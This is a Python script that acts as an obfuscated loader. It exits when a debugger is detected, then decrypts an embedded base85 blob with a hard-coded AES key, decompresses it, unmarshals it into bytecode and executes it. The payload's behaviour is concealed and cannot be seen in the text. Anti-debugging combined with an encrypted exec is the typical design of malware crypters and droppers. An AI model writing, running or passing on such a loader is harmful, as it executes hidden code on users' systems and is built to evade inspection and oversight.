
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\x15\xc8oa\x04\xb0+\x04\xee\x936\xf9\xcf\x93|}\xabn\xe5\xa9\x85\x99\x0b\xc97\nTJ\x03MG\\'
_IV = b'\xf0^6\x17$VF\xf1\xa5S\x1e\xd5\xe2\xfb\xd8\xb2'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'TH#|QkT^u_;ZoWSqb@9CEnI`+K@1q@j0RGmee!(cFTG!`DK09TfHF_2%l`08LJrosE4rs4Hi|p|L3lPnoh5*NX?4E07v(bm!;JlrTyS|$jD>YI(kKc1R~P;^2FokrKw)y-FqULg@7&8%y&)r5B0q?{bQ54!atSr1-U1^}9^{G<5N6qo+tKkYMt)h4%o*1RtZs(zd_8uuNqFgERC5mvU_t6gr5!Q0pu&NuPGHrzCvsVaof$c0IC@M|2piK?#Vq+O6CK)TeFV448U}C_Npqi+#Cfn)FUI<O3Aw8*@r|Et0BgLZ(YohNeN{Q_)+bBj?R~wnb^pWh^l;~Kf0`4mIXi?X=cy+O;9kby3YnxsK6!DQo1{r^1$U30tlaG5{lLx9`;H8RVtx7`1%sZD1(5p(bHR@-d9<STC^>sSEb^NlEhk(D-^X8(QhH7xHa@ON*B97t>-+OCODuH8JJDb^>wy*CN$=Y2xWkEn_dg2tjB#=jvso#yAkP`I(cVR_zAz{Qb<>XU=4ng}J;%$Yc}eDzut)v9L^R;Ot^~DeS99D(VGJODTT8Rp07L@kL?c0^jT3j-shM05;G6ua7Lw+@$c`C?zcS>y;y?-XlJ|Kr8sekN4&YgS5aMY3`E#u<?em@|ybQ;-?LyX%P;=Y}R!Sy7<yGlId}i$vMJ`hzSL+;OX@^{jiI~gtA=v4a;lR3B7Z=V_C|opgDfS3x>y53;ABAS?6JF1@6M3k0f)NP(adul0HRN9=sM>==lPs+;3t>-DVCz2aYqLkVoGF{n7{XK*R=cj*SHwknpAd{)u)s;CU-I+UKt)EiTFdm-FdrqtkU1WvCbEg(60@phlPfCRvRsrOKnp@RT<f=W3!s8Izr?)*+gkWvNl_EiL}`_lf{HJKF{lyWTZV>PQf@S2t7{4_>zFD_6R=^5t*_;vq2}!i#b@wFGnu80d#O$XHi6y*beY0{LYd3wJ)brj*4c7T$b?Txg{u+$tVd4lIlC)m3^lxP`=ERo9FV%efYGh0Q|I3P9rBt*oGt}T^M=e?0bT;kO1)ay1g$xs=x$C~q7^&uU)Z5}$C8J_tPDZQk4J$_+(cO2js(c<gcV@`At;}M)fqsp05#$Ct19JE0PtbRBym(JKUXaNDknS|S8sX^g4%|gilbx(uh>gw2QJJH0fJx%OsXje{`2fU=neHAT!Q(~9Zgq|?6Y@<0-NwY9T&UE9+guW>m#VwWTXl5F7ORMr2bu2AvvYUhf_>s?U+cPcBmz4sz|NVW5<yqO`I;Q1unb&QRd*D&pR*wU1$BGgP^BTuclSa+o06-)+qpK)*(zo3Hs7BMPET_ZE`umQ@7FF$BdH;>lBj+u<khJ1tG7n$epd=&{M9S0a5!xJoT>OLgs3cnK30X!t%1Mtovm0sOO?*9$*fRLux$TmGn#v02kF#lOiEb3WR$7+AuKp);O@mF{-WU7!`RxwJySnEdkrcJ{Ph9f*F~|)!p?H?-ZPTYI(>mMAJw7m2=(~z|rc4q@k2W^rdd=MDS&eVW4i5!MUIv6#px@E~d_Q@h<#sq3>ywaabuA5Vi_}ch-x$>$+4D_a9uO?qGT$n{T4N#W!?w%}e(pULs!D$h8EbTFH?8AeX?7!xLM;k$oTF>L~@?F7+9I(wPtrr9r?ANJd*-d!^w0(RQbl?Y9d-x1n{m!b}^V%iAI-fg;qSX$)7#{5eCNB=T$1kG^1nFQg<#@~^9H7tk{Cd>QtEzFI)lzpI`&#tBio+mV2NQgtowL=FB+soZUr%uw~}s$cI;{SpLIWe=AXy1`<Nrw%S~{g3mLM*&8aZK}xgcOp48WZ$?nFLPv;_}}9U)F(x!1C<GlG4g=jkCd$tH--1Q(fLkiRBaUES97?13s_X<GGi(I27JSeK)%E!lsH_Zn9)#;dISa+v;s5oh!d+94uQ_h-ig0ArFUKpxPa)6LNrypn6DU~HYNpf&IWQ;-M75RAHesWk+U{~`7AUO9Jma*<p$0i2=MO=O^fX=Y;}A%T0nQ>*vUpu>=8+4=V@XA6Cwg_d`_`YI7ArY3T;XeA#AS(<>B{(QNd~CopcmXs1+2@7JW=g5&l#g3?Q&blb!<Qf?4kM{Q--(2gC|dm%^2IVF8t#&i}i2PFyou1oCk9ckz(iib}5}HU~PDzr!fkfk~P+T@fsfhMmdCHty-&II@&O(mckVI<xTCb{T;_FDvi$JUNd4dmfvYgFQD_wChxQU-<jpVlNH|#frX;fPat>qONG*E}*{GFpD*}6>ri&S-~|89@J%j5h?SY|7hs@o!)HG?rLQ9XfM*~_Ei=5KSqIggehQdaEJ8JJEzWJcLUA{XC%DGv5zElw$`8aV>21Jk&Gtc;EmT<@puCaBiOQIp<t&>C}dXAh&~^@SuU1di++)u^lor%o1%h$D7Ib^YpGydgMT+`1Xn;9P9}cknFehD=MeDcDI{=tH;r!e!W-9TFibhX#bqW|R)z)XEeZ<n_wvD`e3b;#gou3=CEaR+PxTjgrswvbA*%w~vYvqA_{L20|Een@QQpkMR&B1)44~v@X8li58%H;3z+=s_9k7~{@w7yW_aYmIm2lnW5D|GGtxij@C`X9Mwt{F4*V>AwWU%=`)_n9cB|lhA4o`Hl1i?X%evupKDh9_OMewIr6B}zC+)z!&5jp|qWoJv?ULS2He8a*FOK30V2zegOO6cZWu?7~#({lpl?6nLZxv1{GuBFkRFlMj{9D7&5#C|y}hsi~Jw(miXO8{C-q{s>`p=2dlrbY~(u)cY~8kaJ?hTduJY+!l<^02{_+3(%NAOufjc*{pHy(!V33ym*rIAovY!?QbDx^1+~Z_~5dq42U%XcLh~O%icPE>P?ou7Tiapfzp`KXzVW5DXj2Im2X-56c2fcS7}H0Ad+Qm#_QPamfGwg%N$*ydJeEamg5c9w)E51d+DhtvuOa(sU7Z@q2K5@pkDP2QW==rqy{%%Chm~P}-@LR1X}#^><}GCw-}}U=W6v5!>a}{O7qC-XJkQcNjS#1FrCiW8ZHi^NCC{fT|v@%D+d3WFNnsB<$Gj3ahW=>MDaSEB+nV$A>)+8L-J&9ww(jL0)<)=TTmL+1aRo;Z;i?!&O|kk1b9)#=mA7Xc0xHvo!Xu7i#!LrK2Ef<6Qx2ONtV_iWzc-e`TSEWHxYuQc97NB2g$olcp`|xv~116>~-c<HV7}>53g=L557qT%a<}8P!z!!NqJ1y>*tVrXhHa0N`)uSgKrlCZO5M?$?%yP0_V>Ib&44r8h@Yc|w<u{7i#%0M7yxt=fooNe#tWT`@ypaGah#&RF4LFe(|AU&mO2fQgY($muh4o8>XhspnIe^YADTE58^J?OFKdpE=qD48C7?Vi!?XE#V%ztu1XL9fEue$b04=!~yqXyDLS$ZKi3;vzg=AFKBK-iTEL3<F^hq%%H%!V8wpy3d*72@At{(aml=!oNm?t#~t&qzijvc|EE-ZJw9<=no@b6>v2QzVF8V%+{?OyJ~41Q?-DYT+BR?G7G<!#_NjT1T3O|#@XdmJBml9zPW1&J*)YqM{rN{TZTVd!5hq!!6Ls^OS~A$O+7_I|O;S{qgW|ci^->edosPvtYb@1}!B;;gn$_-W#BWRj@YFb?AP~65f5Obtzh=m!4vw|XT@_8TJVNfOIo+xYGV8-UopGFV4&6nVgfU1P@=}MO;*|Xx9t&5zL@Z!F&~N5bFR_aENny|^%s8CMAu*Y0{x1?pLjFek>iKY`#Qh=c$5a8yGq!QkS;21Y^`{n1Z-hSiW*G#h=NXDL>*)$41g#Z00YQZT5JH={Ans1R9<dwje<%UwUy0Ku_p*G4UC+kwz9>~bsWjWig~G(9{uEOnRnNs_dxIZ{JUlF71rhgASXu~6o;$0qfBwx0Cw&<4#&@EaKis{i^M_va1b+gu@;jhgkeS<h;4<=Qv?)B<yiz>ahG?&C-&nxxmcd(UpoZkUga062#?j-FWpqARO;w<2mk`aK{<{C^PCF3XEjZOVh{Wr{m1InoX?L!-5tF$EVM-G&<Wb{{58Wjvdbl38'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        